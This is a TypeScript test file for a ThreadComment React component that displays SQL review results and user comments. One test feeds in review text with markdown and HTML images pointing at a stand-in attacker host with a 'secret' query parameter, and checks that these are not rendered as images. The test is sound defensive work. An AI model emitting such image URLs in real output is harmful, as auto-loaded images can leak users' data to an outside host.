import { create } from "@bufbuild/protobuf";
import { timestampFromMs } from "@bufbuild/protobuf/wkt";
import { cleanup, render, within } from "@testing-library/react";
import { afterEach, describe, expect, test, vi } from "vitest";
import {
  IssueComment_ReviewMetadata_Priority,
  IssueComment_ReviewMetadataSchema,
  IssueComment_ThreadState,
  IssueCommentSchema,
  ReviewRun_Type,
} from "@/types/proto-es/v1/issue_service_pb";
import type { Project } from "@/types/proto-es/v1/project_service_pb";

vi.mock("react-i18next", () => ({
  initReactI18next: { type: "3rdParty", init: () => {} },
  useTranslation: () => ({ t: (key: string) => key }),
}));

vi.mock("@/components/HumanizeTs", async () => ({
  ...(await import("@/test-utils/humanizeTs")).humanizeTsStub(),
}));

// The activity module drags Monaco into the test; only the edit rule matters.
vi.mock("@/components/issue-activity/IssueCommentActivity", () => ({
  canEditIssueComment: () => false,
}));

vi.mock("@/hooks/useAppState", () => ({
  useUserByIdentifier: (principal: string | undefined) =>
    principal
      ? {
          name: principal,
          email: principal.replace(/^users\//, ""),
          title: "Alice",
        }
      : undefined,
}));

vi.mock("../PlanTargetDisplay", () => ({
  PlanTargetDisplay: ({ target }: { target: string }) => (
    <span data-testid="target">{target}</span>
  ),
}));

import { ThreadComment } from "./ThreadComment";

afterEach(cleanup);

const ISSUE = "projects/p/issues/1";
const project = { name: "projects/p" } as Project;
const TARGETS = [
  "instances/prod/databases/app",
  "instances/prod/databases/billing",
];

const userComment = (text: string) =>
  create(IssueCommentSchema, {
    name: `${ISSUE}/issueComments/1`,
    comment: text,
    creator: "users/alice@example.com",
    createTime: timestampFromMs(1_000),
    updateTime: timestampFromMs(1_000),
    threadState: IssueComment_ThreadState.OPEN,
  });

const reviewResult = (
  text: string,
  runType = ReviewRun_Type.AI,
  priority = IssueComment_ReviewMetadata_Priority.P0
) =>
  create(IssueCommentSchema, {
    name: `${ISSUE}/issueComments/2`,
    comment: text,
    createTime: timestampFromMs(1_000),
    updateTime: timestampFromMs(1_000),
    threadState: IssueComment_ThreadState.OPEN,
    reviewMetadata: create(IssueComment_ReviewMetadataSchema, {
      runType,
      priority,
      targets: TARGETS,
    }),
  });

const renderComment = (comment: ReturnType<typeof userComment>) =>
  render(
    <ThreadComment comment={comment} onEdit={vi.fn()} project={project} />
  );

describe("ThreadComment", () => {
  test.each([
    {
      runType: ReviewRun_Type.AI,
      reviewer: "sql-review.ai-review.self",
      priority: IssueComment_ReviewMetadata_Priority.P0,
      label: "P0",
    },
    {
      runType: ReviewRun_Type.RULE,
      reviewer: "sql-review.standard-rules.self",
      priority: IssueComment_ReviewMetadata_Priority.P1,
      label: "P1",
    },
  ])(
    "shows a $label review result as $reviewer with the databases it applies to",
    ({ runType, reviewer, priority, label }) => {
      const { container, getByTestId } = renderComment(
        reviewResult("Missing WHERE clause.", runType, priority)
      );
      const header = getByTestId("comment-content").firstElementChild as HTMLElement;

      expect(within(header).getByTitle(reviewer).textContent).toBe(reviewer);
      expect(within(header).getByTestId("reviewer-avatar")).toBeDefined();
      expect(within(header).getByTestId("review-priority").textContent).toBe(
        label
      );
      expect(
        Array.from(container.querySelectorAll("[data-testid='target']")).map(
          (node) => node.textContent
        )
      ).toEqual(TARGETS);
      expect(container.textContent).not.toContain("common.unknown");
      expect(container.textContent).not.toContain("Unknown");
    }
  );

  test("shows a user comment as its author with no review details", () => {
    const { container, getByTitle } = renderComment(
      userComment("Looks good ![screenshot](https://example.com/s.png)")
    );

    expect(getByTitle("Alice").textContent).toBe("Alice");
    expect(container.querySelector("[data-testid='reviewer-avatar']")).toBeNull();
    expect(container.querySelector("[data-testid='review-priority']")).toBeNull();
    expect(container.querySelector("[data-testid='review-targets']")).toBeNull();
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      "https://example.com/s.png"
    );
  });

  test("renders a review result's markdown and HTML images as a link and text, not as images", () => {
    const { container } = renderComment(
      reviewResult(
        'Drop risk\n\n![chart](https://attacker.example/leak.png?q=secret)\n\n<img src="https://attacker.example/raw.png">'
      )
    );

    expect(container.querySelector("img")).toBeNull();
    expect(
      container.querySelector("a[href='https://attacker.example/leak.png?q=secret']")
        ?.textContent
    ).toBe("chart");
    expect(container.textContent).not.toContain("!chart");
    expect(container.textContent).toContain(
      '<img src="https://attacker.example/raw.png">'
    );
  });
});
